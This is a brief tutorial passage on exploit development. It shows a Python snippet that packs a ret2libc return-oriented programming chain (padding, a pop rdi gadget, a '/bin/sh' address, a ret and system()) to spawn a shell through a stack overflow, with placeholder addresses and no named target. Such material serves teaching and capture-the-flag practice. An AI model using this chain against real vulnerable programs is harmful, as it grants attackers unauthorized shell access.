# Crafting the chain — the script


Build the chain in a script — arithmetic, not bytes:

    import struct
    p = lambda x: struct.pack('<Q', x)
    payload  = b'A' * offset
    payload += p(pop_rdi) + p(binsh)
    payload += p(ret)
    payload += p(system)

The script's computation is the audit trail.
